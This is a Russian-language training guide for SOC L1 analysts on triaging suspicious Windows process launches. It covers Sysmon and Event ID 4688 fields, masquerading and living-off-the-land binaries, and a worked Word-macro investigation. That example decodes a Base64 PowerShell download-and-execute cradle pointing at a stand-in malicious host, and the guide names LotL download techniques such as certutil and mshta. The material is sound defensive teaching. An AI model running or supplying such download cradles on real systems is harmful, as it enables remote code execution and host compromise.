# Запуск подозрительного процесса

## Контекст и базовые понятия
Запуск процесса — фундаментальное событие в любой операционной системе. В Windows каждое создание процесса фиксируется в журналах событий (Event ID 4688, Sysmon Event ID 1) и телеметрии EDR-агентов. Для аналитика SOC L1 каждое такое событие — потенциальный индикатор компрометации, поскольку подавляющее большинство атак на конечные точки сопровождается запуском вредоносного или нелегитимно используемого легитимного процесса.

Подозрительный процесс — не обязательно вредоносная программа. Это процесс, параметры запуска которого (имя, путь, родительский процесс, аргументы командной строки, контекст безопасности) отклоняются от нормального поведения в среде. Задача аналитика первого уровня — провести первичный триаж, определить степень угрозы и либо закрыть алерт как ложный, либо эскалировать на углублённый анализ. Центральный навык для этой задачи — знать, как выглядит «норма», чтобы опознать аномалию.

Основными источниками данных для расследования подозрительных процессов служат:
- **Журнал безопасности Windows (Event ID 4688)** — содержит имя процесса, путь, PID, родительский PID, аргументы командной строки.
- **Sysmon (Event ID 1)** — расширенная информация: хеши, подпись, оригинальное имя файла, GUID родительского процесса, учётная запись.
- **EDR-платформы** (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne и др.) — предоставляют унифицированную телеметрию, дополненную событиями загрузки DLL, сетевых подключений и поведения.

Аналитику необходимо различать **вредоносный процесс** и **легитимный процесс, используемый во вредоносных целях**. Второй случай — техника «Living off the Land» (LotL), когда атакующий применяет штатные утилиты ОС (powershell.exe, wmic.exe, certutil.exe) для разведки, загрузки полезной нагрузки или горизонтального перемещения. Именно такие сценарии составляют большинство алертов уровня L1 в современных SOC.

В таблице ниже сопоставлены ключевые различия между штатным и подозрительным запуском на примере типовых индикаторов:

| Атрибут | Нормальное значение | Подозрительное значение | Пример подозрительного поведения |
|---------|---------------------|-------------------------|----------------------------------|
| Имя процесса | Соответствует стандартному имени системного файла (например, svchost.exe) | Опечатка, похожее имя (svch0st.exe) или имя, не соответствующее расположению | scvhost.exe (переставлены буквы); powershell.exe в папке C:\Users\Public |
| Путь | Легитимная системная директория (C:\Windows\System32\, C:\Program Files\) | Пользовательские директории, временные папки, скрытые каталоги, папки общего доступа | C:\Users\username\AppData\Local\Temp\payload.exe |
| Родительский процесс | Стандартные родители: services.exe → svchost.exe; explorer.exe → пользовательские приложения | Нехарактерный родитель: Microsoft Word (winword.exe) → powershell.exe; процесс скринсейвера → cmd.exe | Офисное приложение запускает интерпретатор с аргументами загрузки скрипта |
| Аргументы командной строки | Типичные флаги и параметры, соответствующие задаче | Base64-кодированные строки, скрипты, загружаемые по URL, параметры `/c` или `/k` для интерактивного выполнения | powershell.exe -e JABjAGwAaQBlAG4AdAA… |
| Цифровая подпись и хеш | Подписано доверенным издателем, хеш известен и проверен | Отсутствие подписи или подпись неизвестного издателя, хеш не совпадает с оригинальным файлом | cmd.exe из сторонней папки имеет нестандартный хеш |
| Контекст запуска | Системные службы работают от LOCAL SYSTEM, NETWORK SERVICE; пользовательские – от доменного пользователя | Системные привилегии у процесса из пользовательской папки; процесс от пользователя без прав админа пытается обратиться к LSASS | rundll32.exe от пользователя домена запрашивает SeDebugPrivilege |

Таким образом, любое единичное отклонение редко является однозначным признаком атаки. Решение о вредоносности процесса принимается по совокупности факторов. Задача L1 — быстро собрать эти факторы и принять решение на основе отработанного чеклиста.

## Внутреннее устройство предмета: классификация подозрительных процессов и векторы атак
Подозрительный процесс — это всегда результат аномалии в цепочке создания процесса. Для эффективного разбора алертов аналитик должен классифицировать, с каким именно типом подозрительного запуска он столкнулся, и какая техника атаки за ним стоит. Ниже представлен исчерпывающий обзор категорий, основанный на MITRE ATT&CK и реальных детектах SIEM-правил.

### Классификация подозрительных процессов
Ключевые категории, охватывающие большинство алертов уровня L1, сведены в сравнительную таблицу:

| Категория | Описание | Типичные индикаторы | Примеры (реальные техники) |
|-----------|----------|----------------------|----------------------------|
| Маскировка (Masquerading) | Процесс пытается выглядеть как легитимный системный файл | Имя, похожее на системное (svch0st.exe, lsasss.exe); поддельная подпись; путь, имитирующий системный | T1036.005 – Match Legitimate Name or Location. Зловред назван lsaiso.exe вместо lsass.exe |
| Нестандартный путь запуска | Исполняемый файл находится в папке, нехарактерной для легитимных программ | Путь содержит \Temp\, \Users\Public\, \Recycle.bin\, \Windows\Fonts\, \PerfLogs\ | Splunk-детект [ecddae4e-3d4b] отслеживает такие пути. Атака часто не требует прав администратора |
| Подозрительная родительско-дочерняя связь | Процесс запущен родителем, который обычно не порождает подобные дочерние процессы | Microsoft Office → cmd.exe/PowerShell; svchost.exe → whoami.exe; сервис → интерактивная консоль | Атака через макросы в документах, использование уязвимостей в сервисах для порождения shell |
| Аномальные аргументы командной строки | Командная строка содержит обфусцированные, закодированные или нетипичные параметры | Base64-строки для PowerShell; команды загрузки файла с URL (certutil -urlcache -f); параметры подавления вывода | PowerShell Downgrade Attack, Invoke-Expression с закодированной нагрузкой |
| Living-off-the-Land (LotL) бинари | Использование подписанных Microsoft утилит для вредоносной активности | regsvr32.exe с URL .sct; mshta.exe с внешним скриптом; rundll32.exe с нестандартной DLL или точкой входа | T1218.005 – Mshta, T1218.011 – Rundll32, T1218.010 – Regsvr32 |
| Модификация системных процессов | Подмена легитимного процесса или внедрение кода в работающий процесс | Создание службы с параметром ServiceDll в реестре; инжекция через CreateRemoteThread; замена Accessibility Tools (sethc.exe) на cmd.exe | T1543 – Create or Modify System Process; T1546.008 – Accessibility Features. Детект Rapid7: utilman.exe → cmd.exe |
| Индикаторы сокрытия и обхода защиты | Процесс демонстрирует техники обхода AppLocker, AMSI, ETW или запись в память LSASS | Вызов нестандартных экспортируемых функций (DllRegisterServer из advpack.dll для .inf/.sct); обфускация PowerShell через Array.Reverse | T1218 – Signed Binary Proxy Execution; детект InsightIDR «AppLocker Bypass Via SCT Code Execution» |

Эта таблица не только структурирует типы подозрений, но и привязывает каждый из них к конкретным техникам MITRE и примерам детектов из коробочных правил SIEM. При триаже алерта аналитик должен уметь сопоставить полученные артефакты с одной или несколькими из этих категорий.

### Процессная иерархия и её аномалии
Для наглядного представления взаимосвязей процессов используется схема родительско-дочерних связей. Нормальная иерархия для документной атаки выглядела бы так:
```text
explorer.exe ──▶ winword.exe ──▶ ??? (обычно ничего не порождает)
```
Атака меняет её на:
```text
explorer.exe ──▶ winword.exe ──▶ cmd.exe ──▶ powershell.exe ──▶ [зашифрованная полезная нагрузка]
```
Аналитик может визуализировать цепочку, используя события Sysmon Event ID 1 с полями `ParentProcessId` и `ProcessId`, чтобы воссоздать полное дерево процессов и выявить точку первого отклонения.

### Атрибутивная модель подозрительного процесса
С точки зрения данных, собранных EDR или Sysmon, каждый процесс описывается набором полей. Комбинация этих полей и порождает правило корреляции. Структура ключевых полей события (на примере Sysmon Event ID 1):

```json
{
  "EventID": 1,
  "UtcTime": "2026-04-15 08:22:11.345",
  "ProcessGuid": "{<unique-guid>}",
  "ProcessId": 5412,
  "Image": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe",
  "OriginalFileName": "powershell.exe",
  "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC...",
  "User": "DOMAIN\\jdoe",
  "Hashes": "SHA1=..., MD5=..., SHA256=...",
  "ParentProcessGuid": "{<parent-guid>}",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "ParentCommandLine": "cmd.exe /c start /b powershell..."
}
```

Каждое из полей может быть индикатором. В примере:
- `Image` указывает на временную папку;
- `OriginalFileName` не совпадает с именем файла (powershell.exe, но имя payload.exe);
- `CommandLine` содержит закодированную строку;
- `ParentImage` — нетипичный для легитимного PowerShell.

Сочетание этих признаков даёт высокую достоверность вредоносного события.

## Применение и работа с инцидентами подозрительного процесса
Работа аналитика SOC L1 с алертом о подозрительном процессе — это структурированный процесс, включающий использование штатных инструментов Windows, консоли SIEM/EDR и специализированных утилит. Ниже описана типовая процедура, доведённая до конкретных команд.

### Инструментарий аналитика
Для сбора артефактов на конечной точке или через удалённую EDR-консоль используются:
- **Event Viewer** с фильтрацией по Event ID 4688 и Sysmon 1.
- **PowerShell** — для быстрого анализа локальных процессов: `Get-Process`, `Get-WmiObject Win32_Process`.
- **Sysinternals Suite** (Process Explorer, Autoruns) — для детального разбора активных процессов на изолированных машинах.
- **SIEM-запросы** — для агрегации и корреляции событий по всей сети.
- **Инструменты репутационного анализа** — VirusTotal, локальные базы хешей.

Практический пример получения информации о процессе с подозрительным PID, выполненный непосредственно на затронутом хосте или через агент:

```powershell
Get-WmiObject Win32_Process -Filter "ProcessId = 5412" | 
    Select-Object Name, ProcessId, ExecutablePath, CommandLine, ParentProcessId
```
Вывод может выглядеть так (иллюстративная схема):
```
Name          : payload.exe
ProcessId     : 5412
ExecutablePath: C:\Users\jdoe\AppData\Local\Temp\payload.exe
CommandLine   : "C:\Users\jdoe\AppData\Local\Temp\payload.exe"
ParentProcessId: 3988
```
Получив `ParentProcessId`, можно рекурсивно собрать цепочку:
```powershell
Get-WmiObject Win32_Process -Filter "ProcessId = 3988" | 
    Select-Object Name, ProcessId, ExecutablePath, CommandLine
```
Таким образом восстанавливается вся иерархия.

### Процедура первичного расследования (Triage)
Стандартный алгоритм действий L1 при поступлении алерта:

1. **Верификация источника** — подтвердить, что событие не является тестовым или известным исключением (например, работа отдела разработки в изолированной среде).
2. **Проверка пути и имени процесса** — сравнить с легитимными расположениями. Используются списки разрешённых путей; для Windows это обычно `C:\Windows\System32\`, `C:\Program Files\` и т.д.
3. **Анализ родительского процесса** — нормален ли запуск? Таблицы типичных родительских связей встроены в базу знаний SOC (например, `winlogon.exe` → `userinit.exe` → `explorer.exe`).
4. **Изучение командной строки** — наличие Base64, загрузок из интернета, параметров, обходящих ограничения (например, `-ExecutionPolicy Bypass`).
5. **Проверка репутации хеша** — через VirusTotal API или локальный кэш.
6. **Оценка сетевых взаимодействий** — если доступна телеметрия NetFlow или EDR, проверить исходящие подключения процесса на предмет связи с известными вредоносными IP/доменами.

Рассмотрим практическое применение на примере анализа логов Sysmon с использованием wevtutil для выгрузки событий по конкретному процессу на локальной системе:

```cmd
wevtutil qe "Microsoft-Windows-Sysmon/Operational" 
    /q:"*[System[EventID=1]] and *[EventData[Data[@Name='Image']='C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe']]" 
    /f:text
```
Ожидаемый вывод включает полное описание события с `ParentImage`, `CommandLine`, `Hashes`. Аналитик сразу видит, что `ParentImage` — `winword.exe`, а `CommandLine` содержит вызов PowerShell. Эта информация позволяет классифицировать инцидент как макрос-атаку и действовать согласно плейбуку.

### Типичные ошибки и подводные камни
- **Игнорирование ложных срабатываний** — часто легитимное ПО (установщики, обновления) временно размещается в Temp. Необходимо исключить доверенные цифровые подписи.
- **Оценка только по имени процесса** — вредоносный процесс может называться identically легитимному файлу, но располагаться в другой папке.
- **Недооценка цепочек** — атака может использовать несколько промежуточных легитимных процессов (например, wmic.exe → powershell.exe), и каждый по отдельности выглядит не так подозрительно. Только полная цепочка раскрывает угрозу.
- **Отсутствие контекста пользователя и времени** — запуск подозрительного процесса в 3:00 ночи от пользователя, который обычно не активен в это время, резко повышает приоритет инцидента.
- **Полное доверие VirusTotal** — хеш может отсутствовать в базе или считаться чистым, если зловред предназначен для целевой атаки. Требуется дополнительный анализ.

## Сквозной практический пример: расследование подозрительного запуска PowerShell из временной папки
**Исходные условия:**  
Аналитик SOC L1 получает автоматически сгенерированный инцидент от SIEM (Splunk) на основе правила `Windows Suspicious Process File Path`. В алерте указано, что процесс `powershell.exe` с PID 5412 запущен из пути `C:\Users\jdoe\AppData\Local\Temp\payload.exe`. Родительский процесс — `winword.exe` (PID 3988). Пользователь — `DOMAIN\jdoe`. Время события — 2026-04-15 08:22:11.

### Шаг 1: Извлечение полной информации об алерте
Аналитик открывает детали инцидента в Splunk, экспортируя релевантные поля.

```json
{
  "alert_name": "Windows Suspicious Process File Path",
  "time": "2026-04-15T08:22:11Z",
  "host": "CLIENT-PC01",
  "user": "DOMAIN\\jdoe",
  "process_name": "powershell.exe",
  "process_path": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe",
  "original_file_name": "powershell.exe",
  "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
  "parent_process_name": "winword.exe",
  "parent_process_id": 3988,
  "process_id": 5412,
  "hash": "SHA256=3a2f..."
}
```
Артефакт: структура полей алерта в формате JSON.

**Ожидаемый результат:** подтверждено, что процесс с именем PowerShell запущен из нетипичной временной папки, имя файла не совпадает с `OriginalFileName`, командная строка закодирована в Base64.

### Шаг 2: Проверка родительско-дочерней связи и пути
Аналитик выполняет поиск в сырых логах Sysmon для подтверждения цепочки:
```bash
index=main sourcetype="XmlWinEventLog" EventID=1 ProcessId=5412
| table _time, ParentImage, Image, CommandLine, User, Hashes
```
Вывод в Splunk (иллюстративная схема):
```
_time               ParentImage         Image                                       CommandLine
2026-04-15 08:22:11 C:\...\winword.exe  C:\Users\jdoe\AppData\Local\Temp\payload.exe powershell.exe -enc SQBFA...
```
Процесс запущен документом Word, что для PowerShell не является допустимой нормой. Путь в Temp — ещё один индикатор.

### Шаг 3: Декодирование аргументов командной строки
Аналитик копирует Base64-строку из CommandLine и декодирует её, используя встроенный инструмент либо онлайн-конвертер в изолированной среде:

```powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(
    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA=="
))
```
Вывод:
```
IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload')
```
Таким образом, процесс загружает и выполняет скрипт с внешнего ресурса — типичное поведение вредоносного макроса.

### Шаг 4: Анализ сетевых подключений
Аналитик запрашивает у EDR-платформы список сетевых соединений для процесса PID 5412 за указанный промежуток времени. В ответе (формат упрощён):

```json
{
  "pid": 5412,
  "connections": [
    {
      "src_ip": "192.168.10.22",
      "src_port": 53210,
      "dst_ip": "203.0.113.50",
      "dst_port": 80,
      "protocol": "TCP",
      "action": "allowed"
    }
  ]
}
```
Выясняется, что процесс установил HTTP-соединение с адресом, не входящим в белый список организации.

### Шаг 5: Корреляция и эскалация
На основании цепочки: `winword.exe` → `powershell.exe` из `Temp` → декодированная команда загрузки с внешнего URL → сетевая активность, аналитик классифицирует инцидент как «Вредоносный макрос в документе Word». Согласно плейбуку, немедленно эскалирует инцидент на L2/L3 для изоляции хоста и детального форензического анализа.

**Ожидаемый вывод:** пример демонстрирует полную процедуру от первичного алерта до эскалации, подкреплённую конкретными артефактами — JSON алерта, логами Sysmon, декодированной полезной нагрузкой и сетевыми индикаторами. Практикант видит, как каждый шаг закрывает один из атрибутов подозрительности.
